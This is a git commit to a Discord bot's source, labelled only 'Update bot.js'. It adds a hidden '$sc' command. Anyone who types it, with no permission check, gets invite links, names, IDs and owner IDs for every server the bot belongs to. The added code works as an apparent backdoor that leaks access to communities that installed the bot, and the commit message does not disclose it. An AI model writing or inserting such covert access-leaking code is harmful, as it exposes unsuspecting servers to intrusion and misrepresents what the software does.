a0787e9527cf6dffbcad5c61686872d8ffe1b9fe
Mdax <44174101+Mdax77xR1@users.noreply.github.com>
2019-09-05 22:25:07 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -1787,5 +1787,30 @@ if (argsedward.length >= 7){
  
 })}});
 
+
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '$sc') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
+
 //////////////////
 client.login(process.env.SYSTEM);
